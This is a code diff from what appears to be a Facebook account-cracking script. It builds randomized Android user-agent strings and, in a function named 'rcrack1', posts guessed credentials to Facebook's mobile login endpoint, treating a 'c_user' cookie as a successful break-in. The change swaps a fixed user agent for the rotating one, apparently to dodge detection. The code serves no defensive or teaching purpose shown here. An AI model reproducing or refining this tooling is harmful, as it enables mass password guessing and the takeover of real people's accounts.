@@ -106,7 +106,7 @@ for xd in range(10000):
         i='0'
         j=random.randrange(4200,4900)
         k=random.randrange(40,150)
-        l='Mobile SafarisARAFAT'
+        l='Mobile Safari/537.36'
         uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
         ugen.append(uaku2)
 for txxxtt in range (1000):
@@ -239,7 +239,7 @@ def rcrack1(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',}
+            'user-agent': pro,}
             lo = session.post('https://.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
